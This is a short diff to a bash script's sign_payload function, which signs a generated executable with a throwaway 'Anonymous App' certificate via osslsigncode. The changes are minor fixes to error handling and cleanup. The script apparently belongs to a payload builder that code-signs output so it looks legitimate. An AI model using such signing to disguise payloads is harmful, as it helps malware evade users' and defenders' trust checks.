@@ -114,7 +114,7 @@ sign_payload() {
     echo -e "${YELLOW}${PREFIX} osslsigncode not found. Installing...${NC}"
     if ! apt-get install -y osslsigncode &>/dev/null; then
       echo -e "${RED}${PREFIX} Failed to install osslsigncode.${NC}"
-      exit 1
+      return 1
     fi
   fi
 
@@ -129,16 +129,18 @@ sign_payload() {
   echo -e "${BLUE}${PREFIX} Signing executable...${NC}"
   if osslsigncode sign -pkcs12 anon_cert.pfx -pass "" -n "Anonymous App" -i "https://anonymous.url" \
       -t "http://timestamp.sectigo.com" -in "$OUTPUT" -out "$SIGNED_OUTPUT" &>/dev/null; then
-    echo -e "${GREEN}${PREFIX} Signed executable created: ${WHITE}${OUTPUT}${NC}"
+    echo -e "${GREEN}${PREFIX} Signed executable created: ${WHITE}${SIGNED_OUTPUT}${NC}"
     mv "$SIGNED_OUTPUT" "$OUTPUT"
   else
     echo -e "${RED}${PREFIX} Signing failed.${NC}"
-    exit 1
+    rm -f anon_key.pem anon_cert.pem anon_cert.pfx
+    return 1
   fi
 
   echo -e "${BLUE}${PREFIX} Cleaning up signing files...${NC}"
   rm -f anon_key.pem anon_cert.pem anon_cert.pfx
 }
+
 
 while [[ $# -gt 0 ]]; do
   case "$1" in
